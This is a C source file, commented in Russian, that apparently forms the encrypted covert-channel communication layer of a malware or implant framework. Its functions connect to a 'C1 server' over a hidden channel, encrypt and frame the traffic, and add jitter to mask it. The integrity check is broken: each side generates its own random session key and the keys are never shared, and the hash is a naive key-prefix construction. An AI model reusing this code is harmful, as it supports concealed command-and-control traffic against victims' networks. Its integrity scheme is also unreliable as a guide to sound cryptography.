/**
 * @file crypto_channel.c
 * @brief Интеграция криптографического модуля и модуля скрытых каналов связи
 * @author iamtomasanderson@gmail.com (https://github.com/Personaz1/)
 * @date 2023-09-05
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "../network/covert_channel.h"
#include "../crypto/crypto_utils.h"

/**
 * @brief Структура, содержащая настройки и контексты для криптографического канала
 */
typedef struct {
    CovertChannelHandle channel;         // Дескриптор скрытого канала связи
    CryptoContext *crypto_ctx;           // Контекст шифрования
    CryptoAlgorithm crypto_algorithm;    // Используемый алгоритм шифрования
    HashAlgorithm hash_algorithm;        // Алгоритм хеширования для контроля целостности
    int use_integrity_check;            // Флаг использования проверки целостности
    unsigned char *session_key;         // Ключ сессии (если используется)
    size_t session_key_len;             // Длина ключа сессии
} CryptoChannelContext;

/**
 * @brief Инициализирует криптографический канал связи
 * 
 * @param config Конфигурация скрытого канала
 * @param crypto_alg Алгоритм шифрования
 * @param crypto_key Ключ шифрования
 * @param crypto_key_len Длина ключа шифрования
 * @param crypto_iv Вектор инициализации (может быть NULL для некоторых алгоритмов)
 * @param crypto_iv_len Длина вектора инициализации
 * @param use_integrity Использовать ли проверку целостности
 * @param hash_alg Алгоритм хеширования для проверки целостности
 * @return CryptoChannelContext* Указатель на созданный контекст или NULL при ошибке
 */
CryptoChannelContext* crypto_channel_init(
    const CovertChannelConfig *config, 
    CryptoAlgorithm crypto_alg,
    const unsigned char *crypto_key,
    size_t crypto_key_len,
    const unsigned char *crypto_iv,
    size_t crypto_iv_len,
    int use_integrity,
    HashAlgorithm hash_alg
) {
    if (!config || !crypto_key || crypto_key_len == 0) {
        return NULL;
    }
    
    // Создаем и инициализируем контекст
    CryptoChannelContext *ctx = (CryptoChannelContext*)malloc(sizeof(CryptoChannelContext));
    if (!ctx) {
        return NULL;
    }
    
    memset(ctx, 0, sizeof(CryptoChannelContext));
    
    // Инициализируем криптографический контекст
    ctx->crypto_ctx = crypto_init(crypto_alg, crypto_key, crypto_key_len, crypto_iv, crypto_iv_len);
    if (!ctx->crypto_ctx) {
        free(ctx);
        return NULL;
    }
    
    // Инициализируем канал связи (отключаем встроенное шифрование, так как будем использовать свое)
    CovertChannelConfig modified_config = *config;
    modified_config.encryption = ENCRYPTION_NONE;
    
    ctx->channel = covert_channel_init(&modified_config);
    if (!ctx->channel) {
        crypto_cleanup(ctx->crypto_ctx);
        free(ctx);
        return NULL;
    }
    
    // Сохраняем настройки
    ctx->crypto_algorithm = crypto_alg;
    ctx->hash_algorithm = hash_alg;
    ctx->use_integrity_check = use_integrity;
    
    // Если используем проверку целостности, генерируем сессионный ключ
    if (use_integrity) {
        ctx->session_key_len = 16; // 128 бит
        ctx->session_key = (unsigned char*)malloc(ctx->session_key_len);
        if (!ctx->session_key) {
            covert_channel_cleanup(ctx->channel);
            crypto_cleanup(ctx->crypto_ctx);
            free(ctx);
            return NULL;
        }
        
        // Генерируем случайный ключ сессии
        if (crypto_random_bytes(ctx->session_key, ctx->session_key_len) != 0) {
            free(ctx->session_key);
            covert_channel_cleanup(ctx->channel);
            crypto_cleanup(ctx->crypto_ctx);
            free(ctx);
            return NULL;
        }
    }
    
    return ctx;
}

/**
 * @brief Устанавливает соединение с C1 сервером через скрытый канал
 * 
 * @param ctx Контекст криптографического канала
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
int crypto_channel_connect(CryptoChannelContext *ctx) {
    if (!ctx || !ctx->channel) {
        return -1;
    }
    
    return covert_channel_connect(ctx->channel);
}

/**
 * @brief Создает хеш-код для проверки целостности данных
 * 
 * @param ctx Контекст криптографического канала
 * @param data Указатель на данные
 * @param data_len Размер данных
 * @param hash Буфер для хеша (минимум 32 байта для SHA-256)
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
static int create_integrity_hash(
    CryptoChannelContext *ctx,
    const unsigned char *data,
    size_t data_len,
    unsigned char *hash
) {
    if (!ctx || !data || data_len == 0 || !hash) {
        return -1;
    }
    
    // Сначала создаем HMAC-подобную структуру данных
    unsigned char *hmac_buffer = (unsigned char*)malloc(data_len + ctx->session_key_len);
    if (!hmac_buffer) {
        return -1;
    }
    
    // Объединяем данные с ключом сессии
    memcpy(hmac_buffer, ctx->session_key, ctx->session_key_len);
    memcpy(hmac_buffer + ctx->session_key_len, data, data_len);
    
    // Вычисляем хеш
    int result = crypto_hash(ctx->hash_algorithm, hmac_buffer, data_len + ctx->session_key_len, hash, 32);
    
    // Очищаем и освобождаем буфер
    memset(hmac_buffer, 0, data_len + ctx->session_key_len);
    free(hmac_buffer);
    
    return result;
}

/**
 * @brief Проверяет целостность полученных данных
 * 
 * @param ctx Контекст криптографического канала
 * @param data Указатель на данные
 * @param data_len Размер данных
 * @param received_hash Полученный хеш для проверки
 * @return int 1 при успешной проверке, 0 при ошибке
 */
static int verify_integrity_hash(
    CryptoChannelContext *ctx,
    const unsigned char *data,
    size_t data_len,
    const unsigned char *received_hash
) {
    if (!ctx || !data || data_len == 0 || !received_hash) {
        return 0;
    }
    
    unsigned char calculated_hash[32]; // SHA-256
    
    if (create_integrity_hash(ctx, data, data_len, calculated_hash) != 0) {
        return 0;
    }
    
    // Сравниваем хеши
    return (memcmp(calculated_hash, received_hash, 32) == 0) ? 1 : 0;
}

/**
 * @brief Отправляет данные через криптографический канал
 * 
 * @param ctx Контекст криптографического канала
 * @param data Данные для отправки
 * @param data_len Размер данных
 * @return int Количество отправленных байт или отрицательное значение при ошибке
 */
int crypto_channel_send(CryptoChannelContext *ctx, const unsigned char *data, size_t data_len) {
    if (!ctx || !ctx->channel || !ctx->crypto_ctx || !data || data_len == 0) {
        return -1;
    }
    
    // Буферы для промежуточных данных
    unsigned char *encrypted_data = NULL;
    unsigned char *packet = NULL;
    size_t encrypted_len = 0;
    size_t packet_len = 0;
    int result = -1;
    
    // Оценка размера зашифрованных данных (с запасом)
    size_t max_encrypted_size = data_len + 64; // Добавляем запас для паддинга и т.д.
    
    // Выделяем память под зашифрованные данные
    encrypted_data = (unsigned char*)malloc(max_encrypted_size);
    if (!encrypted_data) {
        return -1;
    }
    
    // Шифруем данные
    encrypted_len = max_encrypted_size;
    if (crypto_encrypt(ctx->crypto_ctx, data, data_len, encrypted_data, &encrypted_len) != 0) {
        free(encrypted_data);
        return -1;
    }
    
    // Размер пакета в зависимости от использования проверки целостности
    size_t total_packet_size = encrypted_len + 4; // 4 байта для размера
    if (ctx->use_integrity_check) {
        total_packet_size += 32; // 32 байта для SHA-256 хеша
    }
    
    // Выделяем память под пакет
    packet = (unsigned char*)malloc(total_packet_size);
    if (!packet) {
        free(encrypted_data);
        return -1;
    }
    
    // Формируем пакет
    packet_len = 0;
    
    // Добавляем размер данных (4 байта, big-endian)
    uint32_t size = (uint32_t)encrypted_len;
    packet[packet_len++] = (size >> 24) & 0xFF;
    packet[packet_len++] = (size >> 16) & 0xFF;
    packet[packet_len++] = (size >> 8) & 0xFF;
    packet[packet_len++] = size & 0xFF;
    
    // Добавляем зашифрованные данные
    memcpy(packet + packet_len, encrypted_data, encrypted_len);
    packet_len += encrypted_len;
    
    // Если используем проверку целостности, добавляем хеш
    if (ctx->use_integrity_check) {
        unsigned char hash[32]; // SHA-256
        if (create_integrity_hash(ctx, encrypted_data, encrypted_len, hash) != 0) {
            free(packet);
            free(encrypted_data);
            return -1;
        }
        
        memcpy(packet + packet_len, hash, 32);
        packet_len += 32;
    }
    
    // Отправляем пакет через скрытый канал
    result = covert_channel_send(ctx->channel, packet, packet_len);
    
    // Очищаем и освобождаем память
    memset(encrypted_data, 0, max_encrypted_size);
    memset(packet, 0, total_packet_size);
    free(encrypted_data);
    free(packet);
    
    return result;
}

/**
 * @brief Получает данные через криптографический канал
 * 
 * @param ctx Контекст криптографического канала
 * @param buffer Буфер для полученных данных
 * @param buffer_size Размер буфера
 * @return int Количество полученных байт или отрицательное значение при ошибке
 */
int crypto_channel_receive(CryptoChannelContext *ctx, unsigned char *buffer, size_t buffer_size) {
    if (!ctx || !ctx->channel || !ctx->crypto_ctx || !buffer || buffer_size == 0) {
        return -1;
    }
    
    // Буфер для получения пакета
    unsigned char *packet = NULL;
    size_t max_packet_size = 8192; // Максимальный размер пакета
    int result = -1;
    
    // Выделяем память под пакет
    packet = (unsigned char*)malloc(max_packet_size);
    if (!packet) {
        return -1;
    }
    
    // Получаем пакет через скрытый канал
    result = covert_channel_receive(ctx->channel, packet, max_packet_size);
    if (result <= 0) {
        free(packet);
        return result;
    }
    
    // Размер полученного пакета
    size_t packet_len = (size_t)result;
    
    // Проверяем минимальный размер пакета (хотя бы 4 байта для размера)
    if (packet_len < 4) {
        free(packet);
        return -1;
    }
    
    // Получаем размер зашифрованных данных
    uint32_t encrypted_size = 
        ((uint32_t)packet[0] << 24) |
        ((uint32_t)packet[1] << 16) |
        ((uint32_t)packet[2] << 8) |
        ((uint32_t)packet[3]);
    
    // Проверяем, что размер в пределах разумного
    if (encrypted_size == 0 || encrypted_size > packet_len - 4) {
        free(packet);
        return -1;
    }
    
    // Проверяем размер пакета с учетом проверки целостности
    size_t expected_size = encrypted_size + 4; // 4 байта для размера
    if (ctx->use_integrity_check) {
        expected_size += 32; // 32 байта для SHA-256 хеша
    }
    
    if (packet_len < expected_size) {
        free(packet);
        return -1;
    }
    
    // Если используем проверку целостности, проверяем хеш
    if (ctx->use_integrity_check) {
        unsigned char *encrypted_data = packet + 4;
        unsigned char *received_hash = packet + 4 + encrypted_size;
        
        if (!verify_integrity_hash(ctx, encrypted_data, encrypted_size, received_hash)) {
            // Ошибка проверки целостности
            free(packet);
            return -1;
        }
    }
    
    // Дешифруем данные
    size_t decrypted_len = buffer_size;
    result = crypto_decrypt(ctx->crypto_ctx, packet + 4, encrypted_size, buffer, &decrypted_len);
    
    // Очищаем и освобождаем пакет
    memset(packet, 0, max_packet_size);
    free(packet);
    
    if (result != 0) {
        return -1;
    }
    
    return (int)decrypted_len;
}

/**
 * @brief Проверяет состояние соединения криптографического канала
 * 
 * @param ctx Контекст криптографического канала
 * @return int 1, если соединение установлено, 0 - если нет, -1 при ошибке
 */
int crypto_channel_is_connected(CryptoChannelContext *ctx) {
    if (!ctx || !ctx->channel) {
        return -1;
    }
    
    return covert_channel_is_connected(ctx->channel);
}

/**
 * @brief Устанавливает параметры jitter для маскировки трафика
 * 
 * @param ctx Контекст криптографического канала
 * @param min_ms Минимальная задержка в миллисекундах
 * @param max_ms Максимальная задержка в миллисекундах
 * @return int 0 при успехе, отрицательное значение при ошибке
 */
int crypto_channel_set_jitter(CryptoChannelContext *ctx, unsigned int min_ms, unsigned int max_ms) {
    if (!ctx || !ctx->channel) {
        return -1;
    }
    
    return covert_channel_set_jitter(ctx->channel, min_ms, max_ms);
}

/**
 * @brief Освобождает ресурсы, выделенные для криптографического канала
 * 
 * @param ctx Контекст криптографического канала
 */
void crypto_channel_cleanup(CryptoChannelContext *ctx) {
    if (!ctx) {
        return;
    }
    
    // Освобождаем ресурсы канала связи
    if (ctx->channel) {
        covert_channel_cleanup(ctx->channel);
    }
    
    // Освобождаем криптографический контекст
    if (ctx->crypto_ctx) {
        crypto_cleanup(ctx->crypto_ctx);
    }
    
    // Очищаем и освобождаем ключ сессии
    if (ctx->session_key) {
        memset(ctx->session_key, 0, ctx->session_key_len);
        free(ctx->session_key);
    }
    
    // Очищаем и освобождаем контекст
    memset(ctx, 0, sizeof(CryptoChannelContext));
    free(ctx);
} 